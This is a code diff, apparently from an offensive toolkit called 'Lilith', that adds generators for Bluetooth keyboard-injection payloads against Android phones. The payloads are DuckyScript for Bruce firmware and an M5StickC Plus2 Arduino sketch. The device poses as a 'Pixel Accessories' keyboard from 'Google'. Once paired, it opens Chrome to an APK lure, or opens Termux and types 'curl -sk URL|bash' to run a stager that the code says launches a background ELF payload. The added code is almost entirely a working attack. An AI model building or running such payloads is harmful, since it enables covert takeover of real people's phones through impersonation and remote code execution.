@@ -29,6 +29,15 @@ _PS_READY_MS = 1800 # PowerShell cold-start
 _LINE_MS     = 400  # pause between line1 and line2
 _EXIT_MS     = 2500 # wait for stager to launch before closing PS
 
+# Android timing constants (UI is slower than Win32 desktop, more variance)
+_AND_SETTLE_MS  = 3000  # wait after BtnA press before first keystroke
+_AND_DISMISS_MS = 300   # between ESC presses to clear popups/overlays
+_AND_HOME_MS    = 1800  # wait after META/Home key for launcher to appear
+_AND_SEARCH_MS  = 900   # wait after typing app name before pressing Enter
+_AND_CHROME_MS  = 4500  # wait for Chrome to fully open (cold start ~3-4s)
+_AND_TERMUX_MS  = 5500  # wait for Termux to fully open (may need package init)
+_AND_CTLL_MS    = 700   # wait after Ctrl+L for address bar focus animation
+
 
 def _esc_c(s: str) -> str:
     return s.replace("\\", "\\\\").replace('"', '\\"')
@@ -164,6 +173,292 @@ def _bruce(lines: list, ble_name: str) -> str:
         "ENTER",
     ]
     return "\n".join(out)
+
+
+def _bruce_android(url: str, mode: str = "chrome") -> str:
+    """DuckyScript for Bruce firmware targeting an Android device.
+
+    mode='chrome'  — opens Chrome and navigates to url
+    mode='termux'  — opens Termux and runs: curl -sk url|bash
+    """
+    if mode == "termux":
+        curl_cmd = f"curl -sk {url}|bash"
+        body = [
+            f"DELAY {_AND_SETTLE_MS}",
+            "ESCAPE",
+            f"DELAY {_AND_DISMISS_MS}",
+            "ESCAPE",
+            f"DELAY {_AND_DISMISS_MS}",
+            "GUI",
+            f"DELAY {_AND_HOME_MS}",
+            "STRING termux",
+            f"DELAY {_AND_SEARCH_MS}",
+            "ENTER",
+            f"DELAY {_AND_TERMUX_MS}",
+            f"STRING {curl_cmd}",
+            "ENTER",
+        ]
+        header_comment = "BadBLE Android - Termux shell stager"
+        tip = "Requires Termux installed on target"
+    else:
+        body = [
+            f"DELAY {_AND_SETTLE_MS}",
+            "ESCAPE",
+            f"DELAY {_AND_DISMISS_MS}",
+            "ESCAPE",
+            f"DELAY {_AND_DISMISS_MS}",
+            "GUI",
+            f"DELAY {_AND_HOME_MS}",
+            "STRING chrome",
+            f"DELAY {_AND_SEARCH_MS}",
+            "ENTER",
+            f"DELAY {_AND_CHROME_MS}",
+            "CTRL l",
+            f"DELAY {_AND_CTLL_MS}",
+            f"STRING {url}",
+            "ENTER",
+        ]
+        header_comment = "BadBLE Android - Chrome URL navigation"
+        tip = "Opens Chrome and downloads Android payload"
+
+    lines = [
+        f"REM Lilith {header_comment}",
+        f"REM {tip}",
+        "REM Screen must be ON and UNLOCKED",
+        "REM BLE name: set in Bruce settings",
+        "REM Copy to SD: /BadBLE/lilith_android.txt",
+        "",
+    ] + body
+    return "\n".join(lines)
+
+
+def _m5stick_android(url: str, ble_name: str, mode: str = "chrome") -> str:
+    """Arduino sketch for M5StickC Plus2 targeting an Android device.
+
+    mode='chrome'  — GUI → launcher search "chrome" → Enter → Ctrl+L → URL → Enter
+    mode='termux'  — GUI → launcher search "termux" → Enter → curl cmd → Enter
+    """
+    if mode == "termux":
+        curl_cmd = url   # url is the full curl command string for termux mode
+        fire_code = (
+            f"    delay({_AND_SETTLE_MS});\n"
+            "\n"
+            "    // Dismiss overlays\n"
+            "    for (int i = 0; i < 2; i++) {\n"
+            "      bleKbd.write(KEY_ESC);\n"
+            f"      delay({_AND_DISMISS_MS});\n"
+            "    }\n"
+            "\n"
+            "    // Home screen\n"
+            "    bleKbd.press(KEY_LEFT_GUI);\n"
+            "    delay(120);\n"
+            "    bleKbd.releaseAll();\n"
+            f"    delay({_AND_HOME_MS});\n"
+            "\n"
+            "    // Open Termux\n"
+            '    bleKbd.print("termux");\n'
+            f"    delay({_AND_SEARCH_MS});\n"
+            "    bleKbd.write(KEY_RETURN);\n"
+            f"    delay({_AND_TERMUX_MS});\n"
+            "\n"
+            "    // Run stager\n"
+            f'    bleKbd.print("{_esc_c(curl_cmd)}");\n'
+            "    bleKbd.write(KEY_RETURN);\n"
+        )
+        done_msg = '"~30s for session"'
+        mode_label = "TERMUX"
+    else:
+        fire_code = (
+            f"    delay({_AND_SETTLE_MS});\n"
+            "\n"
+            "    // Dismiss overlays\n"
+            "    for (int i = 0; i < 2; i++) {\n"
+            "      bleKbd.write(KEY_ESC);\n"
+            f"      delay({_AND_DISMISS_MS});\n"
+            "    }\n"
+            "\n"
+            "    // Home screen\n"
+            "    bleKbd.press(KEY_LEFT_GUI);\n"
+            "    delay(120);\n"
+            "    bleKbd.releaseAll();\n"
+            f"    delay({_AND_HOME_MS});\n"
+            "\n"
+            "    // Open Chrome via launcher search\n"
+            '    bleKbd.print("chrome");\n'
+            f"    delay({_AND_SEARCH_MS});\n"
+            "    bleKbd.write(KEY_RETURN);\n"
+            f"    delay({_AND_CHROME_MS});\n"
+            "\n"
+            "    // Focus Chrome address bar (Ctrl+L)\n"
+            "    bleKbd.press(KEY_LEFT_CTRL);\n"
+            "    bleKbd.press(KEY_L);\n"
+            "    bleKbd.releaseAll();\n"
+            f"    delay({_AND_CTLL_MS});\n"
+            "\n"
+            "    // Navigate to payload page\n"
+            f'    bleKbd.print("{_esc_c(url)}");\n'
+            "    bleKbd.write(KEY_RETURN);\n"
+        )
+        done_msg = '"tap install"'
+        mode_label = "CHROME"
+
+    return (
+        "// Lilith BLE HID — M5StickC Plus2 → Android\n"
+        "// Board  : M5StickC Plus2 (ESP32-S3)\n"
+        "// Libs   : ESP32 BLE Keyboard (T-vK) + M5StickCPlus2\n"
+        f"// Mode   : Android {mode_label}\n\n"
+        "#include <BleKeyboard.h>\n"
+        "#include <M5StickCPlus2.h>\n\n"
+        f'BleKeyboard bleKbd("{ble_name}", "Google", 85);\n\n'
+        "bool fired = false;\n\n"
+        "void cls(uint16_t bg = BLACK) {\n"
+        "  M5.Lcd.fillScreen(bg);\n"
+        "  M5.Lcd.setCursor(0, 10);\n"
+        "  M5.Lcd.setTextColor(WHITE);\n"
+        "}\n\n"
+        "void setup() {\n"
+        "  M5.begin();\n"
+        "  M5.Lcd.setRotation(3);\n"
+        "  M5.Lcd.setTextSize(2);\n"
+        "  cls();\n"
+        '  M5.Lcd.println("LILITH BLE");\n'
+        f'  M5.Lcd.println("ANDROID");\n'
+        "  bleKbd.begin();\n"
+        "}\n\n"
+        "void loop() {\n"
+        "  M5.update();\n\n"
+        "  if (!bleKbd.isConnected()) {\n"
+        "    cls();\n"
+        '    M5.Lcd.println("LILITH BLE");\n'
+        f'    M5.Lcd.println("{ble_name}");\n'
+        "    M5.Lcd.setTextColor(YELLOW);\n"
+        '    M5.Lcd.println("pair Android");\n'
+        "    M5.Lcd.setTextColor(WHITE);\n"
+        "    fired = false;\n"
+        "    delay(1500);\n"
+        "    return;\n"
+        "  }\n\n"
+        "  if (!fired) {\n"
+        "    cls();\n"
+        '    M5.Lcd.println("LILITH BLE");\n'
+        "    M5.Lcd.setTextColor(GREEN);\n"
+        '    M5.Lcd.println("READY");\n'
+        "    M5.Lcd.setTextColor(WHITE);\n"
+        f'    M5.Lcd.println("A = {mode_label}");\n'
+        "  }\n\n"
+        "  if (M5.BtnA.wasPressed() && !fired) {\n"
+        "    fired = true;\n"
+        "    cls(0x1082);\n"
+        "    M5.Lcd.setTextColor(RED);\n"
+        '    M5.Lcd.println("FIRING");\n'
+        "    M5.Lcd.setTextColor(WHITE);\n\n"
+        f"{fire_code}\n"
+        "    cls();\n"
+        "    M5.Lcd.setTextColor(GREEN);\n"
+        '    M5.Lcd.println("DONE");\n'
+        "    M5.Lcd.setTextColor(WHITE);\n"
+        f'    M5.Lcd.println({done_msg});\n'
+        "  }\n\n"
+        "  if (M5.BtnB.wasPressed()) {\n"
+        "    fired = false;\n"
+        "  }\n\n"
+        "  delay(50);\n"
+        "}\n"
+    )
+
+
+_ANDROID_FILENAMES = {
+    "m5stick": ("lilith_android.ino", "open lilith_android/ in Arduino IDE → M5StickC Plus2 → upload"),
+    "bruce":   ("lilith_android.txt", "copy to SD /BadBLE/lilith_android.txt → Bruce → BadBLE → run"),
+}
+
+ANDROID_DEVICES = ("m5stick", "bruce")
+
+
+def build_android_ble_payload(
+    android_url:  str,
+    output_dir:   str,
+    device:       str = "bruce",
+    ble_name:     str = "Pixel Accessories",
+    mode:         str = "chrome",
+) -> bool:
+    """Generate BLE HID payload for M5StickC Plus2 targeting an Android device.
+
+    android_url : URL to navigate Chrome to, OR base URL for curl command (termux mode)
+    output_dir  : directory to write payload files into
+    device      : 'm5stick' | 'bruce' | 'all'
+    ble_name    : BLE device name advertised during pairing
+    mode        : 'chrome' (navigate to APK lure) | 'termux' (open Termux, run stager)
+    """
+    os.makedirs(output_dir, exist_ok=True)
+
+    if mode == "termux":
+        curl_cmd = f"curl -sk {android_url}|bash"
+    else:
+        curl_cmd = android_url   # unused in chrome mode, but we use android_url directly
+
+    targets = list(ANDROID_DEVICES) if device == "all" else [device]
+    ok = False
+
+    for dev in targets:
+        if dev not in _ANDROID_FILENAMES:
+            print(f"[!] Unknown BLE device '{dev}'  (valid: m5stick, bruce, all)")
+            continue
+
+        if dev == "bruce":
+            content = _bruce_android(curl_cmd if mode == "termux" else android_url, mode)
+        else:
+            content = _m5stick_android(
+                curl_cmd if mode == "termux" else android_url,
+                ble_name, mode,
+            )
+
+        filename, note = _ANDROID_FILENAMES[dev]
+        if dev == "m5stick":
+            sketch_name = os.path.splitext(filename)[0]
+            out_dir = os.path.join(output_dir, sketch_name)
+            os.makedirs(out_dir, exist_ok=True)
+        else:
+            out_dir = output_dir
+
+        path = os.path.join(out_dir, filename)
+        with open(path, "w") as f:
+            f.write(content)
+
+        print(f"[+] {dev:<12} → {path}")
+        print(f"    Deploy : {note}")
+        ok = True
+
+    if ok:
+        print()
+        total_s = (
+            _AND_SETTLE_MS
+            + 2 * _AND_DISMISS_MS
+            + _AND_HOME_MS
+            + _AND_SEARCH_MS
+            + (_AND_TERMUX_MS if mode == "termux" else _AND_CHROME_MS)
+            + (_AND_CTLL_MS if mode == "chrome" else 0)
+        ) // 1000 + 2
+        print(f"[*] Estimated execution time : ~{total_s}s")
+        print(f"[*] Mode     : {mode}")
+        print(f"[*] Target   : Android (screen ON + UNLOCKED required)")
+        if mode == "chrome":
+            print(f"[*] Flow     : HOME → launcher search 'chrome' → Ctrl+L → {android_url}")
+            print(f"[*] Outcome  : Chrome opens and begins APK download; user taps Install")
+        else:
+            print(f"[*] Flow     : HOME → launcher search 'termux' → curl cmd")
+            print(f"[*] Command  : {curl_cmd}")
+            print(f"[*] Outcome  : ARM64 ELF payload executes in background, no user interaction")
+        print()
+        if "bruce" in targets:
+            print(f"[*] Bruce    : BLE name is set in Bruce firmware settings menu")
+            print(f"    Trigger  : Bruce menu → BadBLE → lilith_android.txt → run")
+        if "m5stick" in targets:
+            print(f"[*] M5StickC : BLE name advertised = '{ble_name}'")
+            print(f"    Pair     : Android Bluetooth → Add device → '{ble_name}'")
+            print(f"    Trigger  : Button A  |  Re-arm : Button B")
+
+    return ok
 
 
 DEVICES = ("m5stick", "bruce")
